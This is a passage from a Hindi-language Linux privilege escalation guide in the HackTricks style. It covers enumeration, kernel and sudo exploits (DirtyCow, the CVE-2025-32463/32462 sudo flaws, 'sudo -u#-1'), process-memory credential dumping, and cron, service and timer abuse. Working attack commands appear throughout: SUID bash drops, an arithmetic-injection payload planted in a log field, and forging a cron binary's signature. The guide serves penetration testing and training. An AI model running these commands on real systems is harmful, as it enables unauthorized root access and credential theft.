# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए उस OS के बारे में कुछ जानकारी इकट्ठा करना शुरू करें जो चल रहा है
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### पथ

यदि आपके पास `PATH` वेरिएबल के अंदर किसी भी फ़ोल्डर पर **write permissions** हैं, तो आप कुछ libraries या binaries को hijack करने में सक्षम हो सकते हैं:
```bash
echo $PATH
```
### Env info

environment variables में कोई interesting information, passwords या API keys?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version की जांच करें और देखें कि क्या कोई exploit है जिसका उपयोग privileges escalate करने के लिए किया जा सकता है
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
You can find a good vulnerable kernel list and some already **compiled exploits** here: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits को खोजने में मदद करने वाले tools हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim पर execute करें, केवल kernel 2.x के exploits check करता है)

हमेशा **kernel version को Google में search करें**, हो सकता है आपका kernel version किसी kernel exploit में लिखा हो और तब आपको यकीन होगा कि यह exploit valid है।

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

इन कमजोर sudo versions के आधार पर जो यहाँ दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo version vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 से पहले के Sudo संस्करण (**1.9.14 - 1.9.17 < 1.9.17p1**) अनprivileged local users को `/etc/nsswitch.conf` file को user-controlled directory से उपयोग किए जाने पर sudo `--chroot` option के जरिए अपने privileges को root तक escalate करने की अनुमति देते हैं।

इसे exploit करने के लिए यहाँ एक [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) है [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) को exploit करने के लिए। exploit चलाने से पहले, सुनिश्चित करें कि आपका `sudo` version vulnerable है और यह `chroot` feature को support करता है।

अधिक जानकारी के लिए, original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें।

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 से पहले का Sudo (reported affected range: **1.8.8–1.9.17**) **user-supplied hostname** को `sudo -h <host>` से **real hostname** के बजाय host-based sudoers rules evaluate करने के लिए use कर सकता है। अगर sudoers किसी दूसरे host पर broader privileges देता है, तो आप locally उस host को **spoof** कर सकते हैं।

Requirements:
- Vulnerable sudo version
- Host-specific sudoers rules (host is neither the current hostname nor `ALL`)

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
अनुमत host को spoof करके exploit करें:
```bash
sudo -h devbox id
sudo -h devbox -i
```
यदि spoofed name का resolution block हो, तो इसे `/etc/hosts` में जोड़ें या ऐसा hostname उपयोग करें जो पहले से logs/configs में दिखाई देता हो ताकि DNS lookups से बचा जा सके।

#### sudo < v1.8.28

@sickrov से
```
sudo -u#-1 /bin/bash
```
### Dmesg signature सत्यापन विफल

इस vuln का कैसे exploit किया जा सकता है, इसका **example** देखने के लिए **HTB** के **smasher2 box** को देखें
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित defenses की enumeration करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

यदि आप एक container के अंदर हैं, तो container-security सेक्शन से शुरू करें और फिर runtime-specific abuse पेजों में pivot करें:


{{#ref}}
container-security/
{{#endref}}

## Drives

**क्या mounted और unmounted है**, कहाँ और क्यों, यह जांचें। अगर कुछ भी unmounted है, तो आप उसे mount करने की कोशिश कर सकते हैं और private info की जांच कर सकते हैं
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी software

उपयोगी binaries की सूची बनाएं
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, check करें कि **any compiler is installed**. यह उपयोगी है यदि आपको कोई kernel exploit उपयोग करना है, क्योंकि इसे उस machine पर compile करने की सलाह दी जाती है जहाँ आप इसे उपयोग करने वाले हैं (या किसी similar machine पर)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### कमजोर सॉफ़्टवेयर इंस्टॉल किया गया

**इंस्टॉल किए गए पैकेज और services के version** की जांच करें। शायद कोई पुराना Nagios version (उदाहरण के लिए) हो जिसे privilege escalation के लिए exploit किया जा सके…\
सबसे suspicious इंस्टॉल किए गए software के version को manually जांचना recommended है।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH access है, तो आप मशीन के अंदर installed पुराने और vulnerable software की जाँच करने के लिए **openVAS** का भी use कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी information दिखाएँगी जो ज़्यादातर बेकार होगी, इसलिए OpenVAS जैसी applications या similar tools recommended हैं जो यह check करेंगी कि installed software का कोई version known exploits के लिए vulnerable है या नहीं_

## Processes

देखें कि **कौन-कौन से processes** execute हो रहे हैं और check करें कि क्या किसी process के पास **उससे ज़्यादा privileges** हैं जितने उसके पास होने चाहिए (शायद कोई tomcat root द्वारा execute हो रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा चल रहे संभावित [**electron/cef/chromium debuggers**](electron-cef-chromium-debugger-abuse.md) की जांच करें, आप उन्हें privilegeescalate करने के लिए abuse कर सकते हैं। **Linpeas** इन्हें process की command line के अंदर `--inspect` parameter को check करके detect करता है।\
साथ ही **processes binaries पर अपने privileges** भी check करें, शायद आप किसी को overwrite कर सकें।

### Cross-user parent-child chains

**अलग user** के under चल रहा child process, जबकि उसका parent किसी दूसरे user के under है, अपने-आप malicious नहीं होता, लेकिन यह एक useful **triage signal** है। कुछ transitions expected होते हैं (`root` का किसी service user को spawn करना, login managers का session processes बनाना), लेकिन unusual chains wrappers, debug helpers, persistence, या weak runtime trust boundaries को reveal कर सकते हैं।

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
यदि आप कोई surprising chain पाते हैं, तो parent command line और उसके behavior को प्रभावित करने वाली सभी files (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments) inspect करें। कई real privesc paths में child खुद writable नहीं था, लेकिन **parent-controlled config** या helper chain था।

### Deleted executables and deleted-open files

Runtime artifacts अक्सर deletion के बाद भी **accessible** रहते हैं। यह privilege escalation और उस process से evidence recover करने दोनों के लिए उपयोगी है, जिसके पास पहले से sensitive files open हैं।

Deleted executables check करें:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
यदि `/proc/<PID>/exe` `(deleted)` की ओर points करता है, तो process अभी भी memory से पुराने binary image को चला रहा है। यह investigate करने का एक strong signal है क्योंकि:

- removed executable में interesting strings या credentials हो सकते हैं
- running process अभी भी useful file descriptors expose कर सकता है
- एक deleted privileged binary recent tampering या attempted cleanup का संकेत दे सकता है

deleted-open files को globally collect करें:
```bash
lsof +L1
```
यदि आपको कोई interesting descriptor मिले, तो उसे directly recover करें:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
यह विशेष रूप से तब मूल्यवान होता है जब किसी process में अभी भी कोई deleted secret, script, database export, या flag file open हो।

### Process monitoring

आप processes को monitor करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। यह frequently execute होने वाले vulnerable processes को पहचानने, या तब उपयोगी हो सकता है जब requirements का एक set met हो।

### Process memory

Server की कुछ services **credentials को clear text में memory के अंदर save** करती हैं।\
आमतौर पर अन्य users से संबंधित processes की memory पढ़ने के लिए आपको **root privileges** की आवश्यकता होगी, इसलिए यह सामान्यतः तब अधिक उपयोगी होता है जब आप पहले से root हों और और अधिक credentials खोजने चाहते हों।\
हालाँकि, याद रखें कि **एक regular user के रूप में आप अपने own processes की memory पढ़ सकते हैं**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकांश machines **default रूप से ptrace की अनुमति नहीं देतीं** जिसका मतलब है कि आप अपने unprivileged user से संबंधित अन्य processes का dump नहीं ले सकते।
>
> file _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की accessibility को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते उनका uid same हो। यह ptracing के काम करने का classical तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability आवश्यक होती है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी process को ptrace के साथ trace नहीं किया जा सकता। एक बार set होने पर, ptracing को फिर से सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

यदि आपके पास किसी FTP service (उदाहरण के लिए) की memory तक access है, तो आप Heap प्राप्त कर सकते हैं और उसके अंदर credentials खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाते हैं कि memory उस process के** virtual address space में कैसे mapped है; यह प्रत्येक mapped region की **permissions** भी दिखाता है। **mem** pseudo file **processes की memory को ही expose** करती है। **maps** file से हमें पता चलता है कि कौन-से **memory regions readable** हैं और उनके offsets क्या हैं। हम इस जानकारी का उपयोग **mem file में seek करने और सभी readable regions को dump करने** के लिए करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **physical** memory तक पहुंच प्रदान करता है, virtual memory तक नहीं। kernel की virtual address space को /dev/kmem का उपयोग करके access किया जा सकता है।\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा readable होता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### linux के लिए ProcDump

ProcDump, Windows के लिए Sysinternals suite of tools के classic ProcDump tool का Linux reimagining है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) में प्राप्त करें
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

किसी process memory को dump करने के लिए आप उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप root requirements को manually हटाकर उस process को dump कर सकते हैं जो आपके owned है
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)

### Process Memory से Credentials

#### Manual example

अगर आपको पता चलता है कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (process की memory dump करने के अलग-अलग तरीकों के लिए पहले के sections देखें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **memory से clear text credentials चुरा** लेगा और कुछ **well known files** से भी। सही ढंग से काम करने के लिए इसे root privileges चाहिए।

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

अगर कोई web “Crontab UI” panel (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback पर bound है, तब भी आप SSH local port-forwarding के जरिए इसे पहुंच सकते हैं और privilege escalate करने के लिए एक privileged job बना सकते हैं।

Typical chain
- `ss -ntlp` / `curl -v localhost:8000` से loopback-only port (जैसे 127.0.0.1:8000) और Basic-Auth realm discover करें
- operational artifacts में credentials ढूंढें:
- `zip -P <password>` वाले Backups/scripts
- `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` expose करने वाला systemd unit
- Tunnel और login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएँ और उसे तुरंत run करें (SUID shell drops):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएं; इसे एक dedicated user और minimal permissions के साथ constrain करें
- localhost पर bind करें और अतिरिक्त रूप से firewall/VPN के जरिए access restrict करें; passwords को reuse न करें
- unit files में secrets embed करने से बचें; secret stores या root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging enable करें



जांचें कि कोई scheduled job vulnerable है या नहीं। शायद आप root द्वारा execute की जा रही किसी script का फायदा उठा सकते हैं (wildcard vuln? क्या ऐसे files modify कर सकते हैं जिन्हें root इस्तेमाल करता है? symlinks का उपयोग करें? उस directory में specific files बनाएं जिसे root इस्तेमाल करता है?)
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
यदि `run-parts` का उपयोग किया जाता है, तो जांचें कि कौन से names वास्तव में execute होंगे:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
यह false positives से बचाता है। एक writable periodic directory तभी उपयोगी है जब आपके payload का filename local `run-parts` rules से match करे।

### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आपको PATH मिल सकता है: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user "user" के पास /home/user पर writing privileges हैं_)

अगर इस crontab के अंदर root user बिना path set किए कोई command या script execute करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप इसका उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Wildcard के साथ script का उपयोग करके Cron (Wildcard Injection)

अगर root द्वारा execute किया गया कोई script किसी command के अंदर “**\***” रखता है, तो आप इसका exploit करके unexpected चीजें कर सकते हैं (जैसे privesc)। Example:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard के पहले कोई path हो जैसे** _**/some/path/\***_ **, तो यह vulnerable नहीं है (यहां तक कि** _**./\***_ **भी नहीं है).**

और wildcard exploitation tricks के लिए यह page पढ़ें:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash `((...))`, `$((...))` और `let` में arithmetic evaluation से पहले parameter expansion और command substitution करता है। अगर कोई root cron/parser untrusted log fields पढ़ता है और उन्हें arithmetic context में देता है, तो attacker `$(...)` command substitution inject कर सकता है जो cron चलने पर root के रूप में execute होगी।

- Why it works: Bash में expansions इस order में होती हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion. इसलिए `$(/bin/bash -c 'id > /tmp/pwn')0` जैसी value पहले substitute होती है (command run होती है), और फिर बचा हुआ numeric `0` arithmetic के लिए use होता है, इसलिए script बिना errors के continue करती है।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: attacker-controlled text को parsed log में लिखवाएँ ताकि numeric-looking field में command substitution हो और अंत में एक digit हो। सुनिश्चित करें कि आपका command stdout पर print न करे (या उसे redirect करें) ताकि arithmetic valid रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

अगर आप root द्वारा execute होने वाली किसी cron script को **modify** कर सकते हैं, तो आप बहुत आसानी से shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा निष्पादित किया गया script एक **ऐसी directory** का उपयोग करता है जहाँ आपका full access है, तो शायद उस folder को delete करना और **उसकी जगह एक symlink folder बनाना** उपयोगी हो सकता है, जो आपके द्वारा controlled किसी और script को serve करे
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink validation and safer file handling

जब path द्वारा files को read या write करने वाले privileged scripts/binaries की review कर रहे हों, तो verify करें कि links को कैसे handle किया जाता है:

- `stat()` एक symlink को follow करता है और target का metadata return करता है।
- `lstat()` link के स्वयं के metadata को return करता है।
- `readlink -f` और `namei -l` final target को resolve करने और path के हर component की permissions दिखाने में मदद करते हैं।
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
दुर्भावनापूर्ण links tricks के खिलाफ defenders/developers के लिए safer patterns में शामिल हैं:

- `O_EXCL` with `O_CREAT`: अगर path पहले से मौजूद है, तो fail करें (attacker द्वारा पहले से बनाए गए links/files को block करता है)।
- `openat()`: trusted directory file descriptor के relative operate करें।
- `mkstemp()`: secure permissions के साथ temporary files को atomically create करें।

### Writable payloads के साथ Custom-signed cron binaries
Blue teams कभी-कभी cron-driven binaries को “sign” करती हैं, इसके लिए वे एक custom ELF section dump करती हैं और root के रूप में execute करने से पहले vendor string के लिए grep करती हैं। अगर वह binary group-writable है (जैसे, `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) और आप signing material leak कर सकते हैं, तो आप section forge करके cron task hijack कर सकते हैं:

1. Verification flow capture करने के लिए `pspy` use करें। Era में, root ने `objcopy --dump-section .text_sig=text_sig_section.bin monitor` चलाया, उसके बाद `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` किया, और फिर file execute की।
2. leaked key/config (from `signing.zip`) का उपयोग करके expected certificate फिर से बनाएं:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. एक malicious replacement बनाएं (जैसे, SUID bash drop करें, अपनी SSH key add करें) और certificate को `.text_sig` में embed करें ताकि grep pass हो:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute bits preserve करते हुए scheduled binary overwrite करें:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगले cron run का इंतज़ार करें; जैसे ही naive signature check succeed करता है, आपका payload root के रूप में run होगा।

### Frequent cron jobs

आप processes monitor करके ऐसे processes search कर सकते हैं जो हर 1, 2 या 5 minutes में execute हो रहे हैं। शायद आप इसका फायदा उठाकर privileges escalate कर सकते हैं।

उदाहरण के लिए, **1 minute के दौरान हर 0.1s monitor** करने, **कम execute हुए commands के हिसाब से sort** करने और सबसे ज़्यादा execute हुए commands हटाने के लिए, आप यह कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर शुरू होने वाली process को monitor और list करेगा)।

### Root backups that preserve attacker-set mode bits (pg_basebackup)

अगर root-owned cron किसी ऐसे database directory पर `pg_basebackup` (या कोई भी recursive copy) चलाता है जिसमें आप लिख सकते हैं, तो आप एक **SUID/SGID binary** रख सकते हैं, जिसे **root:root** के रूप में, same mode bits के साथ, backup output में फिर से copy कर दिया जाएगा।

Typical discovery flow (as a low-priv DB user):
- `pspy` का इस्तेमाल करके एक root cron को spot करें जो कुछ ऐसा चला रहा हो: `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` हर minute.
- Confirm करें कि source cluster (e.g., `/var/lib/postgresql/14/main`) आपके लिए writable है और destination (`/opt/backups/current`) job के बाद root-owned हो जाता है।

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
यह इसलिए काम करता है क्योंकि `pg_basebackup` क्लस्टर को कॉपी करते समय file mode bits को preserve करता है; जब इसे root द्वारा invoke किया जाता है, तो destination files को **root ownership + attacker-chosen SUID/SGID** मिलता है। permissions को बनाए रखने और executable location में write करने वाली कोई भी similar privileged backup/copy routine vulnerable है।

### Invisible cron jobs

एक cronjob बनाना संभव है जिसमें **comment के बाद carriage return** रखा जाए (बिना newline character के), और cron job काम करेगा। Example (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
इस तरह की stealth entry का पता लगाने के लिए, cron files को उन tools से inspect करें जो control characters expose करते हैं:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

Check करें if you can write any `.service` file, if you can, you **could modify it** so it **executes** your **backdoor when** the service is **started**, **restarted** or **stopped** (maybe you will need to wait until the machine is rebooted).\
For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Keep in mind that if you have **write permissions over binaries being executed by services**, you can change them for backdoors so when the services get re-executed the backdoors will be executed.

### systemd PATH - Relative Paths

You can see the PATH used by **systemd** with:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप path के किसी भी folder में **write** कर सकते हैं, तो आप **escalate privileges** करने में सक्षम हो सकते हैं। आपको **service configurations** files में उपयोग हो रहे **relative paths** को खोजने की आवश्यकता है, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, systemd PATH folder के अंदर, जहाँ आप लिख सकते हैं, relative path binary के समान नाम वाला एक **executable** बनाइए, और जब service से vulnerable action (**Start**, **Stop**, **Reload**) execute करवाया जाए, तो आपका **backdoor** execute होगा (unprivileged users आमतौर पर services start/stop नहीं कर सकते, लेकिन `sudo -l` से check करें कि क्या आप इसका use कर सकते हैं)।

**Services के बारे में अधिक जानने के लिए `man systemd.service` देखें।**

## **Timers**

**Timers** systemd unit files होते हैं जिनका नाम `**.timer**` पर समाप्त होता है, जो `**.service**` files या events को control करते हैं। **Timers** को cron के alternative के रूप में इस्तेमाल किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है और इन्हें asynchronously run किया जा सकता है।

आप सभी timers को इस तरह enumerate कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य timers

यदि आप किसी timer को modify कर सकते हैं, तो आप उसे systemd.unit के कुछ existing components (जैसे `.service` या `.target`) execute कराने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
दस्तावेज़ में आप पढ़ सकते हैं कि Unit क्या है:

